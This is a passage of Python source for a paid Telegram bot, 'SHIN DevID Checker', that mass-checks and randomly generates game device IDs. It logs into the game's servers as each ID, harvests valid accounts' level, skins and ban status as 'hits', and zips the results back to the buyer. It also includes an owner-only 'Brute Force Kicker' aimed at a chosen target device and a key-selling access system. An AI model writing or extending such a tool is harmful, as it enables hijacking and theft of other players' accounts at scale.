            lv_dir = os.path.join(session_dir, "levels"); os.makedirs(lv_dir, exist_ok=True)
            sk_dir = os.path.join(session_dir, "skins"); os.makedirs(sk_dir, exist_ok=True)
            allf = os.path.join(session_dir, "all_valid.txt")
            with save_lock:
                with open(allf, "a", encoding="utf-8") as f: f.write(row + "\n")
                lf = _lv_file(lv_dir, lvl)
                if lf:
                    with open(lf, "a", encoding="utf-8") as f: f.write(row + "\n")
                sf = _sk_file(sk_dir, skin)
                if sf:
                    with open(sf, "a", encoding="utf-8") as f: f.write(row + "\n")
        return True
    except Exception as e:
        log.error(f"write_session_card: {e}"); return None

# ════════════════════════════════════════════════════════════════
# USER MANAGER
# ════════════════════════════════════════════════════════════════

active_jobs = {}; job_lock = threading.Lock()

class UserManager:
    def __init__(self): self._load()
    def _load(self):
        try:
            self.users = json.loads(USERS_FILE.read_text()) if USERS_FILE.exists() else {"users": {}}
            if "users" not in self.users: self.users = {"users": {}}
        except: self.users = {"users": {}}
        try:
            self.keys = json.loads(KEYS_FILE.read_text()) if KEYS_FILE.exists() else {"keys": {}}
            if "keys" not in self.keys: self.keys = {"keys": {}}
        except: self.keys = {"keys": {}}
        self._su(); self._sk()
    def _su(self): USERS_FILE.write_text(json.dumps(self.users, indent=2))
    def _sk(self): KEYS_FILE.write_text(json.dumps(self.keys, indent=2))
    async def _save_users(self): self._su()
    async def _save_keys(self): self._sk()
    async def register_user(self, uid, u=None, f=None):
        k = str(uid)
        if k not in self.users["users"]:
            self.users["users"][k] = {"username":u,"first_name":f,
                "joined":datetime.now().isoformat(),"banned":False,"key_expiry":None,
                "threads_limit":MAX_THREADS_DEFAULT,
                "stats":{"total_checked":0,"total_hits":0},"vip":False,"activated":False}
            await self._save_users(); return True
        return False
    async def is_authorized(self, uid):
        k = str(uid)
        if k == str(OWNER_ID): return True, "admin"
        u = self.users["users"].get(k)
        if not u: return False, "not_registered"
        if u.get("banned"): return False, "banned"
        e = u.get("key_expiry")
        if e is None: return False, "no_key"
        try:
            if datetime.fromisoformat(e) < datetime.now(): return False, "key_expired"
        except: return False, "invalid_expiry"
        return True, "ok"
    async def ban_user(self, uid):
        k = str(uid)
        if k in self.users["users"]:
            self.users["users"][k]["banned"] = True; await self._save_users(); return True
        return False
    async def unban_user(self, uid):
        k = str(uid)
        if k in self.users["users"]:
            self.users["users"][k]["banned"] = False; await self._save_users(); return True
        return False
    async def set_key_expiry(self, uid, dt):
        k = str(uid)
        if k not in self.users["users"]: return False
        self.users["users"][k]["key_expiry"] = dt.isoformat()
        self.users["users"][k]["activated"] = True
        await self._save_users(); return True
    async def generate_key(self, dur, unit, qty=1, mu=1):
        if unit in ('lifetime','l'):
            e = datetime(9999,12,31,23,59,59); d = "🌟 Lifetime"
        else:
            um = {'s':1,'m':60,'h':3600,'d':86400,'y':31536000,
                  'hours':3600,'days':86400,'months':2592000,'lifetime':0}
            e = datetime.now() + timedelta(seconds=dur * um.get(unit.lower(), 86400))
            d = f"{dur} {unit}"
        ks = []
        for _ in range(qty):
            k = f"SHIN-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            while k in self.keys["keys"]:
                k = f"SHIN-{uuid.uuid4().hex[:8].upper()}-{uuid.uuid4().hex[:8].upper()}"
            self.keys["keys"][k] = {"created":datetime.now().isoformat(),"expiry":e.isoformat(),
                "used_by":[],"duration":d,"max_users":mu,"dtype":unit,"dval":dur}
            ks.append(k)
        await self._save_keys(); return ks, d
    async def redeem_key(self, uid, key):
        k = str(uid); kd = self.keys["keys"].get(key)
        if not kd: return False, "Invalid key"
        used = kd.get("used_by", [])
        if k in used: return False, "Key already used by you"
        if len(used) >= kd.get("max_users",1): return False, "Key max users reached"
        e = datetime.fromisoformat(kd["expiry"])
        if e < datetime.now(): return False, "Key expired"
        used.append(k); kd["used_by"] = used
        await self._save_keys(); await self.set_key_expiry(uid, e)
        return True, f"Key redeemed! Valid until {e.strftime('%Y-%m-%d %H:%M')}"
    async def get_all_users(self): return self.users["users"]
    async def get_user_info(self, uid): return self.users["users"].get(str(uid))
    async def get_threads_limit(self, uid):
        u = self.users["users"].get(str(uid))
        return u.get("threads_limit", MAX_THREADS_DEFAULT) if u else MAX_THREADS_DEFAULT
    async def update_stats(self, uid, checked=0, hits=0):
        k = str(uid); u = self.users["users"].get(k)
        if not u: return
        s = u.setdefault("stats", {})
        s["total_checked"] = s.get("total_checked", 0) + checked
        s["total_hits"] = s.get("total_hits", 0) + hits
        await self._save_users()

user_manager = UserManager()

# ════════════════════════════════════════════════════════════════
# LIVE STATS
# ════════════════════════════════════════════════════════════════

class LiveStats:
    def __init__(self, total):
        self.lock = threading.Lock(); self.total = total; self.checked = 0
        self.hits = 0; self.banned = 0; self.failed = 0
        self.start_ts = time.time(); self.recent = []
        self.lv = {k: 0 for _,_,_,k in LEVEL_BRACKETS}
        self.sk = {k: 0 for _,_,_,k in SKIN_BRACKETS}
    def inc(self, key, n=1):
        with self.lock:
            setattr(self, key, getattr(self, key) + n)
            if key == "checked":
                now = time.time(); self.recent.append(now)
                self.recent = [t for t in self.recent if t >= now - 20]
    def bump_brackets(self, lvl, skin):
        with self.lock:
            lk = _lv_key(lvl); skk = _sk_key(skin)
            if lk: self.lv[lk] += 1
            if skk: self.sk[skk] += 1
    def snapshot(self):
        with self.lock:
            now = time.time(); elapsed = max(now - self.start_ts, 0.001)
            span = self.recent[-1] - self.recent[0] if len(self.recent) >= 2 else 0
            cnt = len(self.recent) - 1 if len(self.recent) >= 2 else 0
            live_rate = cnt / span if span > 0.5 else self.checked / elapsed
            avg_rate = self.checked / elapsed
            rem = max(self.total - self.checked, 0)
            eta = rem / live_rate if live_rate > 0.01 else 0
            return {"total": self.total, "checked": self.checked, "hits": self.hits,
                    "banned": self.banned, "failed": self.failed, "elapsed": elapsed,
                    "avg_rate": avg_rate, "live_rate": live_rate, "eta": eta,
                    "lv": dict(self.lv), "sk": dict(self.sk)}

# ════════════════════════════════════════════════════════════════
# ZIP
# ════════════════════════════════════════════════════════════════

TG_MAX_BYTES = 49 * 1024 * 1024

def zip_results(folder):
    folder = Path(folder)
    files = sorted([f for f in folder.rglob("*") if f.is_file() and not f.name.endswith(".zip")])
    if not files: return []
    out = folder / "results.zip"
    try:
        with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in files: zf.write(f, f.relative_to(folder))
        if out.stat().st_size <= TG_MAX_BYTES: return [out]
        out.unlink()
        parts = []; pn = 1; cf = []; cs = 0
        for f in files:
            fs = f.stat().st_size
            if cf and cs + fs > TG_MAX_BYTES:
                po = folder / f"results_part{pn}.zip"
                with zipfile.ZipFile(po, "w", zipfile.ZIP_DEFLATED) as zf:
                    for x in cf: zf.write(x, x.relative_to(folder))
                parts.append(po); pn += 1; cf = []; cs = 0
            cf.append(f); cs += fs
        if cf:
            po = folder / f"results_part{pn}.zip"
            with zipfile.ZipFile(po, "w", zipfile.ZIP_DEFLATED) as zf:
                for x in cf: zf.write(x, x.relative_to(folder))
            parts.append(po)
        return parts
    except Exception as e:
        log.error(f"Zip error: {e}"); return []

# ════════════════════════════════════════════════════════════════
# BULK JOB
# ════════════════════════════════════════════════════════════════

def run_bulk_job(job, loop, app):
    user_id = job["user_id"]; chat_id = job["chat_id"]; msg_id = job["msg_id"]
    devices = job["devices"]; threads = job["threads"]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    sdir = os.path.join(RESULTS_DIR, f"session_{user_id}_{ts}")
    os.makedirs(sdir, exist_ok=True)
    os.makedirs(os.path.join(sdir, "Valid_Hits"), exist_ok=True)
    os.makedirs(os.path.join(sdir, "Banned"), exist_ok=True)
    stats = LiveStats(len(devices)); job["stats"] = stats
    stop_event = threading.Event(); job["stop_event"] = stop_event
    _last = [0.0]

    def upd(force=False, status="RUNNING"):
        now = time.time()
        if not force and (now - _last[0]) < 1.5: return
        _last[0] = now
        snap = stats.snapshot(); text = render_live(snap, status)
        kb = [[InlineKeyboardButton("🛑  Stop", callback_data=f"stop_{user_id}")]]
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=text, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup(kb)), loop)
            fut.result(timeout=10)
        except: pass

    import queue as _q
    hq = _q.Queue()
    def hit_sender():
        while True:
            m = hq.get()
            if m is None: break
            for _ in range(3):
                try:
                    fut = asyncio.run_coroutine_threadsafe(
                        app.bot.send_message(chat_id=chat_id, text=m, parse_mode="Markdown"), loop)
                    fut.result(timeout=30); time.sleep(0.4); break
                except Exception as e:
                    log.error(f"hit sender: {e}"); time.sleep(1.5)
    ht = threading.Thread(target=hit_sender, daemon=False); ht.start()

    def worker(did):
        if job.get("stopped") or stop_event.is_set(): return
        fmt_ok, _ = validate_device_format(did)
        if not fmt_ok:
            stats.inc("checked"); stats.inc("failed")
            upd(); return
        acc = zone = None; st = None
        for _ in range(2):
            if stop_event.is_set(): return
            acc, zone, st = GameLogin(did, stop_event=stop_event).run()
            if st == "ABORTED": return
            if acc and zone: break
            time.sleep(0.5)
        if not acc or not zone:
            stats.inc("checked"); stats.inc("failed")
            upd(); return
        ok = pd = reason = None
        for _ in range(2):
            if stop_event.is_set(): return
            ok, pd, reason, _ = process_detail(did, acc, zone, stop_event=stop_event)
            if reason == "aborted": return
            if ok and pd: break
            time.sleep(0.5)
        stats.inc("checked")
        if ok and pd:
            if is_guest_account(pd.get('account_id')):
                stats.inc("failed"); upd(); return
            is_b = is_banned_status(pd.get('ban_status', ''))
            pd['account_id'] = acc; pd['zone_id'] = zone
            save_account_v2({'Device id': did, 'role_id': acc, 'zone_id': zone}, pd, sdir)
            if is_b:
                stats.inc("banned")
            else:
                nick = str(pd.get('nickname','')).lower()
                if nick not in ('','n/a','unknown','guest'):
                    stats.inc("hits")
                    try: lvl = int(pd.get("level", 0))
                    except: lvl = 0
                    try: skin = int(pd.get("skin_count", 0))
                    except: skin = 0
                    stats.bump_brackets(lvl, skin)
            write_session_card(sdir, did, acc, zone, pd, is_b)
            if not is_b and str(pd.get('nickname','')).lower() not in ('','n/a','unknown','guest'):
                hq.put(line_success(did, pd))
        else:
            stats.inc("failed")
            reason_str = reason or ""
            if (reason_str and
                "lookup_empty" not in reason_str and
                "no_game_server" not in reason_str and
                "unregistered" not in reason_str and
                "guest" not in reason_str.lower() and
                "aborted" not in reason_str.lower()):
                hq.put(line_error(did, reason_str))
        upd()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(worker, d) for d in devices]
        while True:
            snap = stats.snapshot()
            done = (snap["checked"] >= snap["total"]) or job.get("stopped") or stop_event.is_set()
            upd()
            if done: break
            time.sleep(0.2)
        upd(force=True, status="STOPPING")
        for f in futs: f.cancel()

    hq.put(None); ht.join(timeout=180)
    asyncio.run_coroutine_threadsafe(
        user_manager.update_stats(user_id, checked=stats.checked, hits=stats.hits), loop)
    snap = stats.snapshot(); el = int(snap["elapsed"])
    try:
        with open(os.path.join(sdir, "summary.txt"), "w", encoding="utf-8") as f:
            f.write(f"SHIN DevID Checker\n==================\nSession: {ts}\n"
                    f"Total: {snap['total']}\nValid Hits: {snap['hits']}\n"
                    f"Banned: {snap['banned']}\nInvalid: {snap['failed']}\n"
                    f"Elapsed: {_fmt_secs(el)}\nSpeed: {snap['avg_rate']:.2f}/s\nBrand: {BRAND}\n")
    except: pass
    summary = render_summary(snap, snap["elapsed"], sdir)
    time.sleep(0.5); edited = False
    for _ in range(3):
        try:
            fut = asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
                chat_id=chat_id, message_id=msg_id, text=summary, parse_mode="Markdown"), loop)
            fut.result(timeout=30); edited = True; break
        except: time.sleep(1)
    if not edited:
        for _ in range(2):
            try:
                fut = asyncio.run_coroutine_threadsafe(
                    app.bot.send_message(chat_id=chat_id, text=summary, parse_mode="Markdown"), loop)
                fut.result(timeout=30); break
            except: time.sleep(1)
    try:
        zips = zip_results(Path(sdir))
        for zp in zips[:3]:
            for _ in range(3):
                try:
                    with open(zp, "rb") as f:
                        fut = asyncio.run_coroutine_threadsafe(app.bot.send_document(
                            chat_id=chat_id, document=f, filename=f"shin_results_{ts}.zip"), loop)
                        fut.result(timeout=60); break
                except: time.sleep(2)
        try: shutil.rmtree(sdir, ignore_errors=True)
        except: pass
    except: pass
    with job_lock: active_jobs.pop(user_id, None)

# ════════════════════════════════════════════════════════════════
# COMMANDS
# ════════════════════════════════════════════════════════════════

def main_menu_kb(include_admin=False):
    """include_admin=True → user is OWNER; Brute Force + Admin Panel visible."""
    rows = [
        [InlineKeyboardButton("🔥  Bulk Check", callback_data="tool_bulk")],
        [InlineKeyboardButton("🔍  Single Account Check", callback_data="tool_single")],
    ]
    if include_admin:
        rows.append([InlineKeyboardButton("⚡  Brute Force Kicker  👑", callback_data="tool_bruteforce")])
    rows += [
        [InlineKeyboardButton("🎲  Generate IDs", callback_data="tool_generate")],
        [InlineKeyboardButton("📊  Statistics", callback_data="tool_stats")],
        [InlineKeyboardButton("💳  Buy Key", callback_data="menu_buy"),
         InlineKeyboardButton("📖  Help", callback_data="menu_help")],
    ]
    if include_admin:
        rows.append([InlineKeyboardButton("👑  ADMIN PANEL", callback_data="open_admin_panel")])
    return InlineKeyboardMarkup(rows)

async def cmd_start(update, ctx):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not await gate(update, ctx): return
    auth, _ = await user_manager.is_authorized(uid)
    is_admin = (uid == OWNER_ID)
    if auth:
        ui = await user_manager.get_user_info(uid); st = ui.get("stats", {})
        es = ui.get("key_expiry")
        if es:
            try:
                e = datetime.fromisoformat(es)
                ed = "Lifetime" if e.year == 9999 else e.strftime("%Y-%m-%d %H:%M")
            except: ed = "Unknown"
        else: ed = "None"
        text = render_welcome(update.effective_user.first_name or "friend", is_admin, ed,
                             st.get('total_checked',0), st.get('total_hits',0))
        await update.message.reply_text(text, parse_mode="Markdown",
            reply_markup=main_menu_kb(include_admin=is_admin))
    else:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("💳  Buy Access Key", callback_data="menu_buy")],
            [InlineKeyboardButton("📖  Help", callback_data="menu_help")]])
        await update.message.reply_text(render_no_key(), parse_mode="Markdown", reply_markup=kb)

async def cmd_menu(update, ctx):
    if not await gate(update, ctx): return
    uid = update.effective_user.id
    is_admin = (uid == OWNER_ID)
    await update.message.reply_text(render_menu(is_admin), parse_mode="Markdown",
        reply_markup=main_menu_kb(include_admin=is_admin))

async def cmd_generate(update, ctx):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not await gate(update, ctx): return
    auth, r = await user_manager.is_authorized(uid)
    if not auth:
        await update.message.reply_text(f"🚫 Access denied: `{r}`", parse_mode="Markdown"); return
    await update.message.reply_text(render_generate_menu("mix"), parse_mode="Markdown",
        reply_markup=kb_generate_platform())

async def cmd_bruteforce(update, ctx):
    """Admin-only command to start the Brute Force flow."""
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not await gate(update, ctx): return
    if uid != OWNER_ID:
        await update.message.reply_text("👑 *Admin only.*", parse_mode="Markdown"); return
    with job_lock:
        if uid in active_jobs and active_jobs[uid].get("status") == "running":
            await update.message.reply_text("⚠️ Job already running. Use /stop first."); return
        if uid not in active_jobs: active_jobs[uid] = {}
        active_jobs[uid]["awaiting_bf_device"] = True
    await update.message.reply_text(render_bf_menu(), parse_mode="Markdown")

async def cmd_redeem(update, ctx):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not await gate(update, ctx): return
    if not ctx.args:
        await update.message.reply_text("Usage: `/redeem <key>`", parse_mode="Markdown"); return
    key = ctx.args[0].strip(); ok, msg = await user_manager.redeem_key(uid, key)
    if ok:
        ui = await user_manager.get_user_info(uid); exp = datetime.fromisoformat(ui["key_expiry"])
        await update.message.reply_text(
            f"✅  *KEY REDEEMED*\n{LINE_HEAVY}\n┣ 🔑 Key   : `{key}`\n"
            f"┗ ⏳ Until : `{exp.strftime('%Y-%m-%d %H:%M')}`\n{LINE_HEAVY}\nUse /start.\n👑 {BRAND}",
            parse_mode="Markdown")
    else:
        await update.message.reply_text(f"❌ {msg}")

async def cmd_help(update, ctx):
    if not await gate(update, ctx): return
    uid = update.effective_user.id
    admin_line = "┣ ⚡ Brute Force — admin only\n" if uid == OWNER_ID else ""
    await update.message.reply_text(
        f"◇  *HELP*  ◇\n{LINE_HEAVY}\n"
        "┣ 🔥 Bulk Check — `.txt` of device IDs\n"
        "┣ 🔍 Single Check — one device ID\n"
        f"{admin_line}"
        "┣ 🎲 Generate — random device IDs\n"
        "┣ 📊 Statistics — rank counters\n┗ 📖 Menu — /menu\n\n"
        "`/generate` · `/redeem` · `/start` · `/stop`\n"
        f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown")

async def cmd_stop(update, ctx):
    if not await gate(update, ctx): return
    uid = update.effective_user.id
    stopped = False
    with job_lock:
        job = active_jobs.get(uid)
        if job:
            job["stopped"] = True
            ev = job.get("stop_event")
            if ev: ev.set()
            stopped = True
    with _bf_lock:
        ev = _bf_stop_flags.get(uid)
        if ev: ev.set(); stopped = True
    if stopped:
        await update.message.reply_text("🛑 Stopping… (workers aborting)")
    else:
        await update.message.reply_text("No active job.")

async def cmd_status(update, ctx):
    if not await gate(update, ctx): return
    uid = update.effective_user.id
    with job_lock: job = active_jobs.get(uid)
    if job and "stats" in job:
        s = job["stats"].snapshot()
        await update.message.reply_text(render_live(s), parse_mode="Markdown")
    else:
        await update.message.reply_text("No active job.")

def admin_only(fn):
    from functools import wraps
    @wraps(fn)
    async def w(update, context):
        if update.effective_user.id != OWNER_ID:
            await update.message.reply_text("❌ Admin only."); return
        return await fn(update, context)
    return w

@admin_only
async def cmd_admin(update, ctx):
    kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 Gen Key", callback_data="adm_genkey"),
         InlineKeyboardButton("👥 Users", callback_data="adm_users")],
        [InlineKeyboardButton("📊 Stats", callback_data="adm_stats"),
         InlineKeyboardButton("⚡ Running", callback_data="adm_running")],
        [InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast_help")]])
    await update.message.reply_text(f"◇  *ADMIN PANEL*  ◇\n{LINE_HEAVY}", reply_markup=kb, parse_mode="Markdown")

@admin_only
async def cmd_genkey(update, ctx):
    args = ctx.args or []
    try:
        dt = args[0].lower()
        if dt == "lifetime": dv = 0; mu = int(args[1]) if len(args)>1 else 1
        else: dv = int(args[1]); mu = int(args[2])
    except:
        await update.message.reply_text(
            "Usage: `/genkey hours 24 1`\n`/genkey days 7 1`\n"
            "`/genkey months 1 1`\n`/genkey lifetime 1`", parse_mode="Markdown"); return
    keys, _ = await user_manager.generate_key(dv, dt, 1, mu)
    await update.message.reply_text(f"🔑  *KEY*\n{LINE_HEAVY}\n`{keys[0]}`\n{LINE_HEAVY}", parse_mode="Markdown")

@admin_only
async def cmd_ban_user(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/ban_user <id>`"); return
    ok = await user_manager.ban_user(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'✅' if ok else '❌'} `{ctx.args[0]}`")

@admin_only
async def cmd_unban_user(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/unban_user <id>`"); return
    ok = await user_manager.unban_user(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'✅' if ok else '❌'} `{ctx.args[0]}`")

@admin_only
async def cmd_stats(update, ctx):
    users = await user_manager.get_all_users()
    with COUNTER_LOCK:
        rows = "\n".join(f"┣ {r.capitalize():<10}: `{HIT_COUNTERS.get(r,0)}`"
                        for r in ['warrior','elite','master','gm','epic','legend','mythic'])
        sultan = HIT_COUNTERS.get('sultan',0)
    await update.message.reply_text(
        f"◇  *BOT STATISTICS*  ◇\n{LINE_HEAVY}\n┣ 👥 Users   : `{len(users)}`\n{rows}\n"
        f"┗ 👑 Sultan  : `{sultan}`\n{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown")

@admin_only
async def cmd_broadcast(update, ctx):
    if not ctx.args: await update.message.reply_text("Usage: `/broadcast msg`"); return
    msg = " ".join(ctx.args); users = await user_manager.get_all_users(); sent = 0; failed = 0
    sm = await update.message.reply_text(f"📢 Broadcasting to `{len(users)}`...", parse_mode="Markdown")
    for u in users:
        try:
            await ctx.bot.send_message(chat_id=int(u),
                text=f"📢  *ANNOUNCEMENT*\n{LINE_HEAVY}\n{msg}\n{LINE_HEAVY}\n👑 {BRAND}",
                parse_mode="Markdown")
            sent += 1
        except: failed += 1
        await asyncio.sleep(0.06)
    await sm.edit_text(f"✅ Delivered: `{sent}`  ·  Failed: `{failed}`", parse_mode="Markdown")

# ════════════════════════════════════════════════════════════════
# INPUT PROCESSORS
# ════════════════════════════════════════════════════════════════

async def _process_generate(update, ctx, count_str, platform):
    try: count = int(str(count_str).strip())
    except (ValueError, TypeError):
        await update.effective_message.reply_text(
            f"❌ Send a number between `1` and `{MAX_GENERATE_COUNT:,}`.", parse_mode="Markdown"); return
    if count < 1 or count > MAX_GENERATE_COUNT:
        await update.effective_message.reply_text(
            f"❌ Count must be between `1` and `{MAX_GENERATE_COUNT:,}`.", parse_mode="Markdown"); return
    seen = set(); ids = []; attempts = 0
    while len(ids) < count and attempts < count * 10:
        did = generate_device_id(platform)
        if did not in seen:
            seen.add(did); ids.append(did)
        attempts += 1
    if not ids:
        await update.effective_message.reply_text("❌ Failed to generate any IDs."); return
    if len(ids) <= 15:
        txt = render_generate_result(len(ids), ids, platform, preview=15)
        await update.effective_message.reply_text(txt, parse_mode="Markdown"); return
    txt = render_generate_result(len(ids), ids, platform, preview=8)
    await update.effective_message.reply_text(txt, parse_mode="Markdown")
    body = "\n".join(ids)
    bio = io.BytesIO(body.encode("utf-8")); bio.seek(0)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    try:
        await update.effective_message.reply_document(
            document=InputFile(bio, filename=f"generated_{platform}_{ts}.txt"),
            caption=f"📄  *{len(ids)} device IDs* — platform: `{platform}`", parse_mode="Markdown")
    except Exception as e:
        log.error(f"generate file send: {e}")

# ════════════════════════════════════════════════════════════════
# HANDLERS
# ════════════════════════════════════════════════════════════════

async def handle_document(update, ctx):
    uid = update.effective_user.id
    if not await gate(update, ctx): return
    auth, reason = await user_manager.is_authorized(uid)
    if not auth:
        await update.message.reply_text(f"🚫 Access denied: `{reason}`", parse_mode="Markdown"); return
    with job_lock:
        job = active_jobs.get(uid, {})
        wants_bulk = job.get("awaiting_bulk_file")
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Please send a `.txt` file."); return
    f = await ctx.bot.get_file(doc.file_id); data = await f.download_as_bytearray()
    if not wants_bulk:
        await update.message.reply_text("Use /start → 🔥 *Bulk Check* first.", parse_mode="Markdown"); return
    with job_lock:
        if uid in active_jobs and active_jobs[uid].get("status") == "running":
            await update.message.reply_text("⚠️ Job already running."); return
    lines = [l.strip() for l in data.decode(errors="ignore").splitlines() if l.strip()]
    if not lines:
        await update.message.reply_text("No IDs found."); return
    threads = await user_manager.get_threads_limit(uid)
    pm = await update.message.reply_text(
        f"⚡  *LOADING BULK JOB*\n{LINE_HEAVY}\n┣ 📦 IDs     : `{len(lines)}`\n"
        f"┗ 🧵 Threads : `{threads}`\n{LINE_HEAVY}", parse_mode="Markdown")
    job = {"user_id": uid, "chat_id": update.effective_chat.id, "msg_id": pm.message_id,
           "devices": lines, "threads": threads,
           "username": update.effective_user.username or "",
           "first_name": update.effective_user.first_name or "",
           "stopped": False, "checked": 0, "total": len(lines),
           "started": time.time(), "status": "running", "mode": "bulk"}
    with job_lock:
        active_jobs[uid] = job; active_jobs[uid].pop("awaiting_bulk_file", None)
    loop = asyncio.get_event_loop()
    threading.Thread(target=run_bulk_job, args=(job, loop, ctx.application), daemon=True).start()

async def on_text(update, ctx):
    uid = update.effective_user.id
    if not await gate(update, ctx): return
    auth, _ = await user_manager.is_authorized(uid)
    text = update.message.text or ""
    with job_lock:
        job = active_jobs.get(uid, {})
        awaiting = job.get("awaiting_single_device")
        awaiting_gen = job.get("awaiting_generate_count")
        awaiting_bf = job.get("awaiting_bf_device")
        gen_platform = job.get("generate_platform", "mix")

    if awaiting_gen and auth:
        with job_lock: active_jobs.get(uid, {}).pop("awaiting_generate_count", None)
        await _process_generate(update, ctx, text, gen_platform); return

    if awaiting_bf:
        if uid != OWNER_ID:
            with job_lock: active_jobs.get(uid, {}).pop("awaiting_bf_device", None)
            await update.message.reply_text("👑 Admin only."); return
        device_id = text.strip()
        with job_lock:
            active_jobs.get(uid, {}).pop("awaiting_bf_device", None)
            if not active_jobs.get(uid): active_jobs.pop(uid, None)

        # Validate format first
        fmt_ok, fmt_reason = validate_device_format(device_id)
        if not fmt_ok:
            await update.message.reply_text(
                f"❌ Invalid device ID format: `{fmt_reason}`\n"
                f"Example: `ios_64DAC87E-848F-4927-BE05-D0487F9D476E`",
                parse_mode="Markdown"); return

        msg = await update.message.reply_text(
            f"🔍  *VERIFYING TARGET*\n{LINE_HEAVY}\n`{device_id}`\n_This may take up to 30s…_\n{LINE_HEAVY}",
            parse_mode="Markdown")

        profile = await asyncio.to_thread(fetch_session_profile, device_id)
        if not profile:
            await msg.edit_text(
                f"❌ *VERIFICATION FAILED*\n{LINE_HEAVY}\n"
                f"┣ 🆔 Device : `{device_id}`\n"
                f"┗ ⚠️ Reason : login / lookup failed or device is a guest\n"
                f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown"); return

        with _bf_profiles_lock: _bf_profiles[uid] = profile

        await msg.edit_text(render_bf_profile(profile), parse_mode="Markdown",
            reply_markup=kb_bf_modes())
        return

    if awaiting and auth:
        did = text.strip()
        with job_lock:
            active_jobs.get(uid, {}).pop("awaiting_single_device", None)
            if not active_jobs.get(uid): active_jobs.pop(uid, None)
        msg = await update.message.reply_text(
            f"🔍  *SINGLE CHECK*\n{LINE_HEAVY}\n`{did}`\n{LINE_HEAVY}", parse_mode="Markdown")
        acc = zone = None; last_err = None
        for attempt in range(3):
            acc, zone, st = await asyncio.to_thread(lambda: GameLogin(did).run())
            if acc and zone: break
            last_err = st; await asyncio.sleep(1.2)
        if not acc or not zone:
            reason_disp = last_err
            if last_err == "UNREGISTERED":
                reason_disp = "Guest / unregistered device — no real account"
            await msg.edit_text(f"❌ *CHECK FAILED*\n{LINE_HEAVY}\n┣ 🆔 Device : `{did}`\n"
                f"┗ ⚠️ Reason : `{reason_disp}`\n{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown"); return
        ok = pd = reason = None
        for attempt in range(3):
            ok, pd, reason, _ = await asyncio.to_thread(process_detail, did, acc, zone, False)
            if ok and pd: break
            await asyncio.sleep(1.2)
        if not ok or not pd:
            if reason == "unregistered":
                reason = "Guest / unregistered device — no real account"
            await msg.edit_text(f"❌ *CHECK FAILED*\n{LINE_HEAVY}\n┣ 🆔 Device : `{did}`\n"
                f"┣ 🎮 Acc    : `{acc}`\n┣ 🌐 Zone   : `{zone}`\n┗ ⚠️ Reason : `{reason}`\n"
                f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown"); return
        pd['account_id'] = acc; pd['zone_id'] = zone
        card = render_card(did, pd)
        try: await msg.edit_text(card, parse_mode="Markdown")
        except Exception: await msg.edit_text(f"```\n{card}\n```")
        is_b = is_banned_status(pd.get('ban_status', ''))
        await user_manager.update_stats(uid, checked=1, hits=0 if is_b else 1)
        return

async def handle_callback(update, ctx):
    q = update.callback_query
    try: await q.answer()
    except: pass
    data = q.data; uid = update.effective_user.id

    if data == "verify_join":
        invalidate_membership(uid); ok, missing = await check_membership(ctx.bot, uid)
        if ok: await q.edit_message_text("✅ *Verified!* Tap /start.", parse_mode="Markdown")
        else:
            ml = "\n".join(f"  • {m}" for m in missing)
            await q.edit_message_text(f"⚠️ Still missing:\n{ml}", parse_mode="Markdown",
                                       reply_markup=kb_join_channels())
        return

    if uid != OWNER_ID:
        ok, _ = await check_membership(ctx.bot, uid)
        if not ok:
            await q.edit_message_text(render_join_gate(update.effective_user.first_name or "there"),
                parse_mode="Markdown", reply_markup=kb_join_channels()); return

    if data == "tool_bulk":
        auth, r = await user_manager.is_authorized(uid)
        if not auth: await q.edit_message_text(f"🚫 `{r}`", parse_mode="Markdown"); return
        with job_lock:
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_bulk_file"] = True
        await q.edit_message_text(f"📤  *BULK CHECK MODE*\n{LINE_HEAVY}\n"
            "Send a `.txt` file — one Device ID per line.\n"
            "Both `and_` and `ios_` supported.\n"
            f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown"); return

    if data == "tool_single":
        auth, r = await user_manager.is_authorized(uid)
        if not auth: await q.edit_message_text(f"🚫 `{r}`", parse_mode="Markdown"); return
        with job_lock:
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_single_device"] = True
        await q.edit_message_text(f"🔍  *SINGLE CHECK MODE*\n{LINE_HEAVY}\n"
            "Send the Device ID as text.\n"
            "Both `and_` and `ios_` supported.\n"
            f"{LINE_HEAVY}\n👑 {BRAND}", parse_mode="Markdown"); return

    if data == "tool_bruteforce":
        if uid != OWNER_ID:
            await q.answer("👑 Admin only.", show_alert=True); return
        with job_lock:
            if uid in active_jobs and active_jobs[uid].get("status") == "running":
                await q.edit_message_text("⚠️ Job already running. Use /stop first."); return
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_bf_device"] = True
